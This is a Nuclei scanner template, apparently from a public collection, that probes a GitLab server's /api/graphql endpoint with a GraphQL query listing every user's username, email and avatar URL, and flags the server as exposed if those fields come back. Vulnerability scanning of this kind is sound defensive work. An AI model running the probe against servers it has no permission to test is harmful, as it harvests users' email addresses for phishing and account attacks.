id: gitlab-user-enumeration

info:
  name: Gitlab User enumeration
  author: pikpikcu
  severity: info
  tags: gitlab,enum


requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/graphql"
    headers:
      Content-Type: application/json
    body: |
        {
           "query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    }\n   }\n  }\n }"
        }


    matchers-condition: and
    matchers:
      - type: word
        words:
          - "application/json"
        part: header

      - type: word
        words:
          - avatarUrl
          - username
          - email
        condition: and

      - type: status
        status:
          - 200
